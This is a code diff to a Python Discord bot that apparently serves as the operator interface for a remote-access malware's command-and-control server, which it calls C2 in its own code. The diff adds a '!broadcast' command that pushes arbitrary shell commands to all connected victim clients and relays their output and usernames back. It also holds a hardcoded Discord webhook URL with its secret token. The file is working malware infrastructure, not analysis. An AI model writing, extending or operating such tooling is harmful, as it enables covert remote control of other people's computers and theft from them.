@@ -16,11 +16,12 @@ import struct
 import threading
 import time
 
-# Fix encoding for Windows
-sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
-sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
+if __name__ == "__main__":
+    if hasattr(sys.stdout, "buffer") and getattr(sys.stdout, "encoding", "").lower() != "utf-8":
+        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
+import os
 
-DISCORD_BOT_TOKEN = "DISCORD_BOT_TOKEN"
+DISCORD_BOT_TOKEN = os.getenv("PHANTOMLINK_BOT_TOKEN", "")
 DISCORD_CHANNEL_ID = 1525081606501568577
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1525081864094613615/4DkAojzJaoqsbolWR2E59IVwWeZY21CVr4-eNcnvXWB2nAKad4wpQ3mZVddNnNlw8pV7"
 
@@ -279,6 +280,7 @@ async def on_ready():
 
 @client.event
 async def on_message(message):
+    global TARGET_CLIENT
     if message.author == client.user:
         return
 
@@ -294,7 +296,7 @@ async def on_message(message):
         try:
             req = urllib.request.Request(f"http://{C2_HOST}:{API_PORT}/api/clients")
             req.add_header('X-API-Key', API_KEY)
-            with urllib.request.urlopen(req) as response:
+            with urllib.request.urlopen(req, timeout=10) as response:
                 data = json.loads(response.read())
                 clients = data.get('clients', [])
                 if not clients:
@@ -310,7 +312,6 @@ async def on_message(message):
     # ── !select ──
     elif content_lower.startswith("!select"):
         parts = content_lower.split()
-        global TARGET_CLIENT
         if len(parts) == 1:
             TARGET_CLIENT = "all"
             await message.channel.send("✅ Target set to **ALL clients**")
@@ -421,6 +422,32 @@ async def on_message(message):
         else:
             await message.channel.send("✅ Command sent (no output)")
 
+    # ── !broadcast <raw command> ──
+    elif content_lower.startswith("!broadcast ") or content_lower == "!broadcast":
+        parts = content.split(maxsplit=1)
+        if len(parts) < 2:
+            await message.channel.send("❌ Usage: `!broadcast <command>`")
+            return
+
+        raw_cmd = parts[1].strip()
+        await message.channel.send(f"📢 **Broadcasting to ALL clients:** `{raw_cmd[:100]}`...")
+        print(f"[*] Broadcast CMD from {message.author}: {raw_cmd}")
+
+        orig_target = TARGET_CLIENT
+        try:
+            TARGET_CLIENT = "all"
+            result = await send_commands_to_clients([raw_cmd])
+        finally:
+            TARGET_CLIENT = orig_target
+
+        if result:
+            if len(result) > 1900:
+                result = result[:1900] + "\n... (truncated)"
+            await message.channel.send(f"```\n{result}\n```")
+        else:
+            await message.channel.send("✅ Broadcast command sent (no output)")
+
+
     # ── Unknown command ──
     elif content.startswith("!"):
         cmd_name = content.split()[0]
@@ -477,9 +504,23 @@ def _send_commands_sync(commands):
                     res_data = json.loads(response.read())
                     res_list = res_data.get('results', [])
                     if not res_list:
-                        results_str += "[!] ไม่มี client เชื่อมต่ออยู่\n"
+                        if TARGET_CLIENT == 'all':
+                            results_str += "[!] ❌ ไม่มี client เชื่อมต่ออยู่เลย (No clients connected)\n"
+                        else:
+                            results_str += f"[!] ❌ ไม่พบเป้าหมาย ID: {TARGET_CLIENT} (Client may have disconnected)\n"
                     for r in res_list:
-                        results_str += f"[Client {r['client_id']}] Status: {r['status']}\n"
+                        cid = r.get('client_id')
+                        status = r.get('status')
+                        output = r.get('output')
+                        user = r.get('username')
+                        user_info = f" ({user})" if user else ""
+                        if status == 'not_found':
+                            results_str += f"[Client {cid}] ❌ Status: Not Found (Disconnected)\n"
+                        else:
+                            if output:
+                                results_str += f"[Client {cid}{user_info}] Status: {status}\n{output}\n"
+                            else:
+                                results_str += f"[Client {cid}{user_info}] Status: {status}\n"
             except urllib.error.URLError as e:
                 results_str += f"[!] C2 Server connection error: {e.reason}\n"
             except Exception as e:
@@ -491,14 +532,6 @@ def _send_commands_sync(commands):
         return f"[!] Error communicating with C2 API: {e}"
 
 
-def _recv_exactly(sock, n):
-    data = b''
-    while len(data) < n:
-        packet = sock.recv(n - len(data))
-        if not packet:
-            return None
-        data += packet
-    return data
 
 
 async def main():
